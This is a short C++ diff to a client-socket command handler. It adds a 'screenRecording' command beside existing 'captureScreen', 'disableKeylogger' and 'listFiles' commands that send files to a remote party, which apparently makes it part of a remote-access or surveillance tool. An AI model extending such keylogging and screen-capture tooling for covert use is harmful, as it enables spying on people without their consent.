@@ -159,7 +159,8 @@ bool ClientSocket::executeCommand(std::string &response, std::string& receivedFi
                 command == "listInstalledApp" ||
                 command == "listFiles" ||
                 command == "captureScreen" ||
-                command == "disableKeylogger" ) {
+                command == "disableKeylogger" ||
+                command == "screenRecording" ) {
         // These command has file send back to client
         // Receive the file name from the server
         memset(buffer, 0, sizeof(buffer));
@@ -202,6 +203,7 @@ bool ClientSocket::executeCommand(std::string &response, std::string& receivedFi
         }
     }
 }
+
 void ClientSocket::processQueue() {
     while (true) {
         std::unique_lock<std::mutex> lock(queueMutex);
